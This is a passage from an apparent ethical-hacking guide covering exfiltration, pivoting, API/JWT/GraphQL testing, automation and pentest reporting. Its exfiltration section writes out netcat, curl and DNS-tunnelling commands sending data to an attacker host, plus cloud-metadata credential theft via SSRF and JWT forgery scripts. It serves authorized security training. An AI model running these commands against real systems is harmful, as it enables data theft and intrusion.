ls -la /var/run/docker.sock

# Kernel exploits
uname -a
searchsploit linux kernel $(uname -r)
```

### 3. Data Exfiltration

**Database Dump**:
```bash
# MySQL dump
mysqldump -h $TARGET_IP -u root -p database_name > database_dump.sql

# MongoDB dump
mongodump --host $TARGET_IP --port 27017 --out mongo_dump/

# PostgreSQL dump
pg_dump -h $TARGET_IP -U postgres database_name > postgres_dump.sql

# Redis dump
redis-cli -h $TARGET_IP SAVE
redis-cli -h $TARGET_IP --rdb dump.rdb
```

**File Exfiltration**:
```bash
# Compress sensitive files
tar -czf data.tar.gz /var/www/html/config/
tar -czf logs.tar.gz /var/log/

# Transfer methods
# SCP
scp data.tar.gz user@YOUR_IP:/tmp/

# Netcat
# On attacker machine
nc -lvnp 4444 > data.tar.gz
# On target
cat data.tar.gz | nc YOUR_IP 4444

# HTTP
# On attacker machine
python3 -m http.server 8000
# On target
curl -F "file=@data.tar.gz" http://YOUR_IP:8000/upload

# Base64 over DNS (stealth)
cat data.txt | base64 | while read line; do
    dig $line.yourdomain.com
done
```

### 4. Network Pivoting

**Setup SSH Tunnel**:
```bash
# Local port forwarding
ssh -L 8080:internal-server:80 user@$TARGET_IP

# Dynamic port forwarding (SOCKS proxy)
ssh -D 9050 user@$TARGET_IP

# Configure proxychains
echo "socks5 127.0.0.1 9050" >> /etc/proxychains.conf

# Use proxychains
proxychains nmap -sT internal-network.local
proxychains curl http://internal-app.local
```

**Metasploit Pivoting**:
```bash
# In Metasploit session
meterpreter > run autoroute -s 10.10.10.0/24
meterpreter > background

# Setup port forwarding
msf6 > use auxiliary/server/socks_proxy
msf6 > set SRVPORT 9050
msf6 > run -j

# Scan internal network
proxychains nmap -sT 10.10.10.0/24
```

---

## Phase 6: Reporting

### 1. Generate Comprehensive Report

```bash
# Create report structure
mkdir -p reports/{executive,technical,evidence}

# Executive Summary
cat > reports/executive/executive-summary.md << EOF
# Penetration Test Report - Executive Summary

## Target Information
- Organization: Your Company
- Target: $TARGET
- IP Address: $TARGET_IP
- Test Date: $(date)
- Tester: $(whoami)

## Executive Summary
This penetration test was conducted to identify security vulnerabilities
in the target web application hosted at $TARGET.

## Key Findings
- Critical: X findings
- High: X findings
- Medium: X findings
- Low: X findings
- Informational: X findings

## Risk Assessment
[Overall risk level and impact]

## Recommendations Summary
1. Immediate action items
2. Short-term improvements
3. Long-term security strategy

## Compliance Status
[OWASP Top 10, PCI-DSS, etc.]
EOF

# Technical Report
cat > reports/technical/technical-report.md << EOF
# Penetration Test - Technical Report

## Methodology
1. Reconnaissance
2. Scanning & Enumeration
3. Vulnerability Assessment
4. Exploitation
5. Post-Exploitation
6. Reporting

## Scope
### In Scope
- $TARGET and all subdomains
- All web applications
- APIs
- Infrastructure

### Out of Scope
- Third-party services
- Social engineering
- Physical security

## Tools Used
$(cat << 'TOOLS'
- Nmap
- Burp Suite
- OWASP ZAP
- SQLMap
- Nikto
- Nuclei
- Metasploit
- Custom scripts
TOOLS
)

## Findings

### Critical Findings

#### 1. SQL Injection in Login Form
**Severity**: Critical
**CVSS Score**: 9.8
**Affected URL**: https://$TARGET/login
**Description**: The login form is vulnerable to SQL injection...
[Detailed description]

**Proof of Concept**:
\`\`\`bash
sqlmap -u "https://$TARGET/login" --data="username=admin&password=test"
\`\`\`

**Evidence**:
[Screenshot: evidence/sql-injection-1.png]

**Impact**:
- Complete database compromise
- Unauthorized access to all accounts
- Data breach

**Remediation**:
1. Use parameterized queries
2. Implement input validation
3. Apply principle of least privilege to database user

**References**:
- OWASP SQL Injection: https://owasp.org/www-community/attacks/SQL_Injection
- CWE-89: https://cwe.mitre.org/data/definitions/89.html

---

[Continue for each finding...]

## Network Infrastructure

### Open Ports
$(cat scans/port-summary.txt)

### SSL/TLS Configuration
$(cat scans/ssl-test.txt | head -50)

## Application Security

### Authentication & Session Management
[Findings related to auth]

### Input Validation
[Findings related to input validation]

### Configuration & Deployment
[Findings related to config]

## Appendices

### Appendix A: Detailed Port Scan Results
[Link to full scan results]

### Appendix B: Web Application Scan Results
[Link to OWASP ZAP/Nikto reports]

### Appendix C: Vulnerability References
[Links to CVEs, OWASP resources]
EOF
```

### 2. Create Findings Database

```bash
# JSON database of findings
cat > reports/findings.json << 'EOF'
{
  "findings": [
    {
      "id": "F001",
      "title": "SQL Injection in Login Form",
      "severity": "Critical",
      "cvss": 9.8,
      "status": "Open",
      "affected_url": "https://example.com/login",
      "description": "The login form does not properly sanitize user input...",
      "impact": "Complete database compromise possible",
      "remediation": "Implement parameterized queries",
      "evidence": ["evidence/sql-injection-1.png", "evidence/sql-injection-2.png"],
      "discovered_date": "2025-01-08",
      "cwe": "CWE-89",
      "owasp": "A03:2021 - Injection"
    },
    {
      "id": "F002",
      "title": "Cross-Site Scripting in Search Function",
      "severity": "High",
      "cvss": 7.2,
      "status": "Open",
      "affected_url": "https://example.com/search",
      "description": "User input in search parameter is reflected without sanitization...",
      "impact": "Session hijacking, credential theft",
      "remediation": "Implement output encoding and CSP",
      "evidence": ["evidence/xss-1.png"],
      "discovered_date": "2025-01-08",
      "cwe": "CWE-79",
      "owasp": "A07:2021 - Cross-Site Scripting"
    }
  ]
}
EOF
```

### 3. Evidence Collection

```bash
# Screenshot script
cat > scripts/take-screenshots.sh << 'EOF'
#!/bin/bash
# Take screenshots of findings

# Install screenshot tool
sudo apt install -y scrot

# Screenshot vulnerable pages
firefox "https://$TARGET/vulnerable-page" &
sleep 5
scrot -u reports/evidence/screenshot-$(date +%s).png

# Or use headless browser
python3 << 'PYTHON'
from selenium import webdriver
from selenium.webdriver.firefox.options import Options

options = Options()
options.headless = True
driver = webdriver.Firefox(options=options)

driver.get('https://example.com/vulnerable-page')
driver.save_screenshot('reports/evidence/selenium-screenshot.png')
driver.quit()
PYTHON
EOF

chmod +x scripts/take-screenshots.sh
```

### 4. Generate HTML Report

```python
# Create report generator
cat > scripts/generate-report.py << 'EOF'
#!/usr/bin/env python3
import json
from datetime import datetime

# Read findings
with open('reports/findings.json', 'r') as f:
    data = json.load(f)

# Generate HTML
html = f"""
<!DOCTYPE html>
<html>
<head>
    <title>Penetration Test Report</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 40px; }}
        .critical {{ color: #d32f2f; font-weight: bold; }}
        .high {{ color: #f57c00; font-weight: bold; }}
        .medium {{ color: #fbc02d; font-weight: bold; }}
        .low {{ color: #388e3c; font-weight: bold; }}
        table {{ border-collapse: collapse; width: 100%; margin: 20px 0; }}
        th, td {{ border: 1px solid #ddd; padding: 12px; text-align: left; }}
        th {{ background-color: #333; color: white; }}
    </style>
</head>
<body>
    <h1>Penetration Test Report</h1>
    <p>Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
    
    <h2>Summary</h2>
    <table>
        <tr>
            <th>Severity</th>
            <th>Count</th>
        </tr>
"""

# Count by severity
severity_counts = {}
for finding in data['findings']:
    sev = finding['severity']
    severity_counts[sev] = severity_counts.get(sev, 0) + 1

for severity, count in severity_counts.items():
    html += f"""
        <tr>
            <td class="{severity.lower()}">{severity}</td>
            <td>{count}</td>
        </tr>
"""

html += """
    </table>
    
    <h2>Detailed Findings</h2>
"""

for finding in data['findings']:
    html += f"""
    <div style="margin: 30px 0; padding: 20px; border-left: 4px solid #333;">
        <h3>[{finding['id']}] {finding['title']}</h3>
        <p><strong>Severity:</strong> <span class="{finding['severity'].lower()}">{finding['severity']}</span></p>
        <p><strong>CVSS Score:</strong> {finding['cvss']}</p>
        <p><strong>Affected URL:</strong> <code>{finding['affected_url']}</code></p>
        <p><strong>Description:</strong> {finding['description']}</p>
        <p><strong>Impact:</strong> {finding['impact']}</p>
        <p><strong>Remediation:</strong> {finding['remediation']}</p>
        <p><strong>CWE:</strong> {finding['cwe']}</p>
        <p><strong>OWASP:</strong> {finding['owasp']}</p>
    </div>
"""

html += """
</body>
</html>
"""

# Save HTML report
with open('reports/penetration-test-report.html', 'w') as f:
    f.write(html)

print("Report generated: reports/penetration-test-report.html")
EOF

chmod +x scripts/generate-report.py
python3 scripts/generate-report.py
```

---

## Advanced Techniques

### 1. API Security Testing

```bash
# Discover API endpoints
cat > scripts/api-discovery.sh << 'EOF'
#!/bin/bash

# Common API paths
declare -a api_paths=(
    "/api"
    "/api/v1"
    "/api/v2"
    "/v1"
    "/v2"
    "/rest"
    "/graphql"
    "/swagger"
    "/api/swagger.json"
    "/api/openapi.json"
    "/api-docs"
)

for path in "${api_paths[@]}"; do
    echo "Testing: https://$TARGET$path"
    curl -s -o /dev/null -w "%{http_code}" "https://$TARGET$path"
    echo ""
done
EOF

chmod +x scripts/api-discovery.sh
./scripts/api-discovery.sh

# Test API with different methods
for method in GET POST PUT DELETE PATCH OPTIONS; do
    echo "Testing $method"
    curl -X $method https://$TARGET/api/users/1
done

# Test for mass assignment
curl -X PUT https://$TARGET/api/users/1 \
    -H "Content-Type: application/json" \
    -d '{
        "name": "Test",
        "role": "admin",
        "isAdmin": true
    }'

# Test for IDOR
for id in {1..100}; do
    curl -s "https://$TARGET/api/users/$id" | grep -i "email"
done
```

### 2. GraphQL Testing

```bash
# GraphQL introspection
curl -X POST https://$TARGET/graphql \
    -H "Content-Type: application/json" \
    -d '{"query": "{__schema{types{name,fields{name}}}}"}' \
    | jq '.' > scans/graphql-schema.json

# Depth attack
curl -X POST https://$TARGET/graphql \
    -H "Content-Type: application/json" \
    -d '{
        "query": "query { users { posts { comments { author { posts { comments { text } } } } } } }"
    }'

# Batch attack
python3 << 'PYTHON'
import requests
import json

url = 'https://example.com/graphql'
queries = [{'query': '{users{id,email}}'} for _ in range(100)]

response = requests.post(url, json=queries)
print(response.text)
PYTHON
```

### 3. WebSocket Testing

```bash
# WebSocket connection test
python3 << 'PYTHON'
import websocket

def on_message(ws, message):
    print(f"Received: {message}")

def on_error(ws, error):
    print(f"Error: {error}")

def on_close(ws):
    print("Connection closed")

def on_open(ws):
    print("Connection opened")
    # Test for injection
    ws.send('<script>alert("XSS")</script>')
    # Test for command injection
    ws.send('{"cmd": "$(whoami)"}')

ws = websocket.WebSocketApp("wss://example.com/socket",
                          on_message = on_message,
                          on_error = on_error,
                          on_close = on_close)
ws.on_open = on_open
ws.run_forever()
PYTHON
```

### 4. JWT Token Testing

```bash
# Decode JWT
echo "eyJhbGc..." | base64 -d

# Test for algorithm confusion
cat > scripts/jwt-test.py << 'EOF'
#!/usr/bin/env python3
import jwt
import base64
import json

# Captured token
token = "paste.your.token.here"

# Decode without verification
decoded = jwt.decode(token, options={"verify_signature": False})
print("Decoded token:")
print(json.dumps(decoded, indent=2))

# Test 1: None algorithm
header = {"alg": "none", "typ": "JWT"}
payload = decoded
none_token = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=') + '.' + \
             base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=') + '.'
print(f"\nNone algorithm token:\n{none_token}")

# Test 2: Weak secret brute force
weak_secrets = ['secret', 'password', '123456', 'admin', 'test']
for secret in weak_secrets:
    try:
        jwt.decode(token, secret, algorithms=["HS256"])
        print(f"✓ FOUND! Weak secret: {secret}")
        break
    except:
        pass
EOF

chmod +x scripts/jwt-test.py
python3 scripts/jwt-test.py
```

### 5. Cloud Metadata Exploitation

```bash
# AWS metadata
curl -s http://169.254.169.254/latest/meta-data/
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/

# GCP metadata
curl -s "http://metadata.google.internal/computeMetadata/v1/?recursive=true" \
    -H "Metadata-Flavor: Google"

# Azure metadata
curl -s -H "Metadata:true" \
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01"

# Test via SSRF
curl "https://$TARGET/fetch?url=http://169.254.169.254/latest/meta-data/"
```

---

## Automation Scripts

### 1. Complete Automated Scanner

```bash
cat > scripts/auto-scan.sh << 'EOF'
#!/bin/bash

# Automated Penetration Testing Script

TARGET=$1
if [ -z "$TARGET" ]; then
    echo "Usage: $0 <target-domain>"
    exit 1
fi

echo "[+] Starting automated penetration test for $TARGET"
echo "[+] Start time: $(date)"

# Create directories
mkdir -p auto-scan/{recon,scans,exploits}

# Phase 1: Reconnaissance
echo "[+] Phase 1: Reconnaissance"
echo "  [*] WHOIS lookup..."
whois $TARGET > auto-scan/recon/whois.txt

echo "  [*] DNS enumeration..."
dig $TARGET ANY > auto-scan/recon/dns.txt

echo "  [*] Subdomain enumeration..."
sublist3r -d $TARGET -o auto-scan/recon/subdomains.txt 2>/dev/null

echo "  [*] Technology detection..."
whatweb $TARGET > auto-scan/recon/tech.txt

echo "  [*] WAF detection..."
wafw00f https://$TARGET > auto-scan/recon/waf.txt

# Phase 2: Scanning
echo "[+] Phase 2: Scanning"
TARGET_IP=$(dig +short $TARGET | head -1)

echo "  [*] Port scanning..."
nmap -sS -sV -p- $TARGET_IP -oA auto-scan/scans/nmap 2>/dev/null

echo "  [*] Directory bruteforce..."
gobuster dir -u https://$TARGET \
    -w /usr/share/wordlists/dirb/common.txt \
    -q -o auto-scan/scans/gobuster.txt 2>/dev/null

# Phase 3: Vulnerability Assessment
echo "[+] Phase 3: Vulnerability Assessment"

echo "  [*] Nikto scan..."
nikto -h https://$TARGET -output auto-scan/scans/nikto.txt 2>/dev/null

echo "  [*] Nuclei scan..."
nuclei -u https://$TARGET \
    -severity critical,high \
    -o auto-scan/scans/nuclei.txt 2>/dev/null

echo "  [*] SSL/TLS test..."
testssl.sh https://$TARGET > auto-scan/scans/ssl.txt 2>/dev/null

# Phase 4: Reporting
echo "[+] Phase 4: Generating Report"

# Count findings
CRITICAL=$(grep -i "critical" auto-scan/scans/* 2>/dev/null | wc -l)
HIGH=$(grep -i "high" auto-scan/scans/* 2>/dev/null | wc -l)
MEDIUM=$(grep -i "medium" auto-scan/scans/* 2>/dev/null | wc -l)

cat > auto-scan/report.txt << REPORT
========================================
Automated Penetration Test Report
========================================
Target: $TARGET
IP: $TARGET_IP
Date: $(date)

SUMMARY:
--------
Critical Findings: $CRITICAL
High Findings: $HIGH
Medium Findings: $MEDIUM

Subdomains Found: $(cat auto-scan/recon/subdomains.txt 2>/dev/null | wc -l)
Open Ports: $(grep "open" auto-scan/scans/nmap.nmap 2>/dev/null | wc -l)

See detailed results in auto-scan/ directory
REPORT

cat auto-scan/report.txt
echo "[+] Scan complete! Results in auto-scan/"
echo "[+] End time: $(date)"
EOF

chmod +x scripts/auto-scan.sh

# Usage
# ./scripts/auto-scan.sh example.com
```

### 2. Continuous Monitoring Script

```bash
cat > scripts/monitor.sh << 'EOF'
#!/bin/bash

TARGET=$1
INTERVAL=3600  # 1 hour

while true; do
    echo "[$(date)] Monitoring $TARGET..."
    
    # Check if site is up
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" https://$TARGET)
    echo "Status: $STATUS"
    
    # Check for new subdomains
    subfinder -d $TARGET -silent | \
        sort -u > /tmp/current-subs.txt
    
    if [ -f /tmp/previous-subs.txt ]; then
        NEW_SUBS=$(comm -13 /tmp/previous-subs.txt /tmp/current-subs.txt)
        if [ ! -z "$NEW_SUBS" ]; then
            echo "New subdomains found:"
            echo "$NEW_SUBS"
        fi
    fi
    
    mv /tmp/current-subs.txt /tmp/previous-subs.txt
    
    # Quick vulnerability scan on new findings
    # Add your scan logic here
    
    sleep $INTERVAL
done
EOF

chmod +x scripts/monitor.sh
```

### 3. Custom Exploit Development Template

```python
cat > exploits/exploit-template.py << 'EOF'
#!/usr/bin/env python3
"""
Exploit Title: [Vulnerability Name]
Date: 2025-01-08
Exploit Author: Your Name
Vendor Homepage: https://example.com
Version: 1.0.0
Tested on: [OS/Platform]
CVE: CVE-2024-XXXX
"""

import requests
import sys
import argparse
from urllib.parse import urljoin

class Exploit:
    def __init__(self, target_url, payload):
        self.target_url = target_url
        self.payload = payload
        self.session = requests.Session()
    
    def check_vulnerability(self):
        """Check if target is vulnerable"""
        try:
            response = self.session.get(self.target_url)
            # Add vulnerability check logic
            if "vulnerable_pattern" in response.text:
                print("[+] Target appears vulnerable!")
                return True
            else:
                print("[-] Target does not appear vulnerable")
                return False
        except Exception as e:
            print(f"[-] Error: {e}")
            return False
    
    def exploit(self):
        """Execute the exploit"""
        try:
            print("[*] Exploiting target...")
            
            # Add exploit logic here
            data = {
                "param": self.payload
            }
            
            response = self.session.post(
                urljoin(self.target_url, "/vulnerable-endpoint"),
                data=data
            )
            
            if response.status_code == 200:
                print("[+] Exploit successful!")
                print(response.text)
                return True
            else:
                print("[-] Exploit failed")
                return False
                
        except Exception as e:
            print(f"[-] Error during exploitation: {e}")
            return False

def main():
    parser = argparse.ArgumentParser(description='Exploit Template')
    parser.add_argument('-u', '--url', required=True, help='Target URL')
    parser.add_argument('-p', '--payload', default='default', help='Payload')
    args = parser.parse_args()
    
    print("""
    ╔═══════════════════════════════════╗
    ║   Exploit Template v1.0           ║
    ║   Use only on authorized targets  ║
    ╚═══════════════════════════════════╝
    """)
    
    exploit = Exploit(args.url, args.payload)
    
    if exploit.check_vulnerability():
        confirm = input("[?] Proceed with exploitation? (y/n): ")
        if confirm.lower() == 'y':
            exploit.exploit()
    else:
        print("[*] Exiting")

if __name__ == "__main__":
    main()
EOF

chmod +x exploits/exploit-template.py
```

---

## Quick Reference Commands

### Essential One-Liners

```bash
# Quick subdomain enumeration
subfinder -d example.com -silent | httpx -silent | nuclei -t ~/nuclei-templates/ -severity critical,high

# Fast port scan + service detection
nmap -sS -sV --top-ports 1000 -T4 example.com

# Quick directory scan
feroxbuster -u https://example.com -w /usr/share/wordlists/dirb/common.txt -t 50 -d 1

# SQL injection test
sqlmap -u "https://example.com/page?id=1" --batch --level=3 --risk=2

# XSS scan
dalfox url https://example.com/search?q=test

# Check security headers
curl -I https://example.com | grep -E "X-|Content-Security|Strict-Transport"

# SSL test
testssl.sh --fast https://example.com

# Technology detection
whatweb -v https://example.com

# WAF detection
wafw00f https://example.com

# Find admin panels
ffuf -u https://example.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302
```

---

## Best Practices

### 1. Testing Ethically
- ✅ Always have written authorization
- ✅ Respect scope boundaries
- ✅ Don't cause damage
- ✅ Report findings responsibly
- ✅ Maintain confidentiality
- ✅ Follow responsible disclosure

### 2. Documentation
- Document every command executed
- Take screenshots of findings
- Save all output files
- Maintain detailed timeline
- Track remediation progress

### 3. Communication
- Notify before aggressive testing
- Report critical findings immediately
- Provide clear remediation steps
- Be available during testing period
- Follow up on fixes

### 4. Safety Measures
- Test during off-peak hours
- Use rate limiting
- Monitor system health
- Have rollback plan ready
- Stop if instability detected

---

## Post-Assessment Checklist

```markdown
## After Testing Completion

- [ ] All findings documented
- [ ] Evidence collected and organized
- [ ] Screenshots taken
- [ ] Report generated
- [ ] Client notified
- [ ] Critical issues escalated
- [ ] Remediation guidance provided
- [ ] Retest scheduled
- [ ] Tools cleaned up
- [ ] Access removed
- [ ] Notes archived
- [ ] Lessons learned documented
```

---

## Emergency Procedures

### If Something Goes Wrong

```bash
# 1. Stop all testing immediately
killall nmap nikto sqlmap

# 2. Document what happened
echo "$(date): Issue occurred during testing of $TARGET" >> incident.log
echo "Action taken: [describe]" >> incident.log

# 3. Notify stakeholders
# Send email/call immediately

# 4. Preserve evidence
tar -czf evidence-$(date +%Y%m%d-%H%M%S).tar.gz ~/pentest/

# 5. Assist with recovery
# Follow incident response plan
```

---

## Additional Resources

### Cheat Sheets
```bash
# Download useful cheat sheets
mkdir -p ~/cheatsheets
cd ~/cheatsheets

wget https://github.com/OWASP/CheatSheetSeries/archive/master.zip
unzip master.zip

# Bookmark these URLs:
# https://pentestbook.six2dez.com/
# https://book.hacktricks.xyz/
# https://github.com/swisskyrepo/PayloadsAllTheThings
```

### Practice Labs
- HackTheBox: https://hackthebox.eu
- TryHackMe: https://tryhackme.com
- PentesterLab: https://pentesterlab.com
- PortSwigger Academy: https://portswigger.net/web-security
- DVWA: Damn Vulnerable Web Application
- Metasploitable: Intentionally vulnerable VM

### Continuous Learning
```bash
# Stay updated
# 1. Follow security researchers on Twitter
# 2. Read security blogs daily
# 3. Practice regularly on CTF platforms
# 4. Contribute to bug bounty programs
# 5. Join security communities (Discord, Reddit)
# 6. Attend security conferences (DEF CON, Black Hat)
# 7. Get certified (OSCP, CEH, GWAPT)
```

---

## Final Reminders

⚠️ **CRITICAL**: This guide is for testing your own systems only!

**Legal Requirements:**
1. Own the target system, OR
2. Have explicit written permission, AND
3. Stay within defined scope, AND
4. Follow responsible disclosure, AND
5. Document everything, AND
6. Report findings properly

**Professional Ethics:**
- Never harm systems
- Protect discovered vulnerabilities
- Don't exploit findings maliciously
- Help organizations improve security
- Build trust in the security community

**Success Metrics:**
- Vulnerabilities found and reported
- Clear remediation guidance provided
- System security improved
- Knowledge shared with team
- Continuous security culture promoted

---

## Testing Workflow Summary

```
1. AUTHORIZATION → Get written permission
2. RECONNAISSANCE → Gather information passively
3. SCANNING → Identify live systems and services
4. ENUMERATION → Discover detailed information
5. VULNERABILITY ASSESSMENT → Find security weaknesses
6. EXPLOITATION → Verify vulnerabilities (carefully)
7. POST-EXPLOITATION → Assess full impact
8. REPORTING → Document and communicate findings
9. REMEDIATION SUPPORT → Help fix issues
10. RETEST → Verify fixes implemented
```

---

**Version**: 1.0  
**Last Updated**: January 2025  
**Maintained By**: Your Security Team  
**License**: For authorized security testing only

---

*Remember: Real security professionals protect, not harm. Use these skills to make the internet safer for everyone.*

**Happy Ethical Hacking! 🛡️**